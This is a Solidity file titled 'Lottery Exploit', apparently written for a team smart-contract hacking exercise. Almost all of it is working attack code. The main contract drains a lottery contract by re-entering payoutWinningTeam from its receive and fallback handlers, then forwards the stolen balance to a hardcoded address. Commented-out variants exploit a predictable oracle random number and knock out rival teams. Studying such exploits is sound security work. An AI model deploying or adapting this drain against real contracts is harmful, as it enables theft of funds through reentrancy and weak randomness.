/* Lottery Exploit
- comparison of different approaches and my test of assumptions
Paste in REMIX 
*/


// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IOracle {
    function getRandomNumber() external view returns (uint256);
}

interface ILottery {
    function payoutWinningTeam(address) external returns (bool);
}

address constant LotteryAddress = 0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A;
address constant TeamAddress = 0x971ed3B1D66A445d20e75EdE714e64f00e9cAFF8;

contract DrainLottery {

    // addresss payable public owner;
    // ILottery public lottery;
    IOracle public oracle;

    // constructor(address _owner, address _lottery, address _oracle) public {
    //     // owner = _owner;
    //     lottery = ILottery(_lottery);
    //     oracle = IOracle(_oracle);
    // }

    constructor(){
        oracle = IOracle(0x0d186F6b68a95B3f575177b75c4144A941bFC4f3);
    }

    function getOracleNumber() view public returns (uint256){
         return oracle.getRandomNumber();
    }

    function drain() public {
        ILottery(LotteryAddress).payoutWinningTeam(address(this));
    }

    fallback() external payable {
        drain();
    }

    function cashOut() public {
        (bool sent,) = TeamAddress.call{value: address(this).balance}("cash~out");
        require(sent);
    }

    // function drain() public {
    //     lo.makeAGuess(address(this), or.getRandomNumber());
    //     lo.payoutWinningTeam(address(this));
    // }

    receive() external payable {
        if (gasleft() > 40_000) {
            // lo.payoutWinningTeam(address(this));
            ILottery(LotteryAddress).payoutWinningTeam(address(this));
        }
    }

    function withdraw() public {
        (bool sent,) = address(0x971ed3B1D66A445d20e75EdE714e64f00e9cAFF8).call{value: address(this).balance}("withdraw");
        // (bool sent,) = address(0x36efd039149b9F5aF6aC75d85A8d3e9088bc7d4f).call.value(address(this).balance)("");
        require(sent);
    }


}

// interface IOracle {
//     function getRandomNumber() external view returns (uint256);
// }

// interface ILottery {
//     function makeAGuess(address _team, uint256 _guess) external returns (bool);
//     function payoutWinningTeam(address _team) external returns (bool);
// }




// praaaagma solidity >=0.7.0 <0.9.0;

// import "@openzeppelin/contracts/access/Ownable.sol";

// address constant LotteryAddress = 0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A;
// address constant TeamAddress = 0x971ed3B1D66A445d20e75EdE714e64f00e9cAFF8;

// interface ILottery {
//     function payoutWinningTeam(address) external returns (bool);
// }


/**
 * @title DrainLottery
 * @dev 
 */
// contract DrainLottery is Ownable {
//     function drain() public {
//         ILottery(LotteryAddress).payoutWinningTeam(address(this));
//     }

//     function setOtherTeamPointsToZero(address _otherTeam) public {
//         require(_otherTeam != Team9Address, "You can't stop TEAM 9!");
//         ILottery(LotteryAddress).payoutWinningTeam(_otherTeam);
//     }

//     fallback() external payable {
//         drain();
//     }

//     function cashOut() public {
//         Team9Address.call{value: address(this).balance}("Hack success!");
//     }

// }

/*
// SsssPDX-License-Identifier: UNLICENSED
praaaagma solidity 0.6.0;

import "./Lottery.sol";
import "./Oracle.sol";

contract Drainer {
    Lottery lo = Lottery(0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A);
    Oracle or = Oracle(0x0d186F6b68a95B3f575177b75c4144A941bFC4f3);

    function drain() public {
        lo.makeAGuess(address(this), or.getRandomNumber());
        lo.payoutWinningTeam(address(this));
    }

    receive() external payable {
        if (gasleft() > 40_000) {
            lo.payoutWinningTeam(address(this));
        }
    }

    function withdraw() public {
        (bool sent,) = address(0x36efd039149b9F5aF6aC75d85A8d3e9088bc7d4f).call.value(address(this).balance)("");
        require(sent);
    }
}
*/
/*
interface IOracle {
    function getRandomNumber() external view returns (uint256);
}

interface ILottery {
    function makeAGuess(address _team, uint256 _guess) external returns (bool);
    function payoutWinningTeam(address _team) external returns (bool);
}

contract Attack {
    addresss payable public owner;
    ILottery public lottery;
    IOracle public oracle;

    constructor(address _owner, address _lottery, address _oracle) public {
        owner = _owner;
        lottery = ILottery(_lottery);
        oracle = IOracle(_oracle);
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function attack() external onlyOwner {
        lottery.makeAGuess(owner, oracle.getRandomNumber());
        lottery.payoutWinningTeam(owner);
    }
}
*/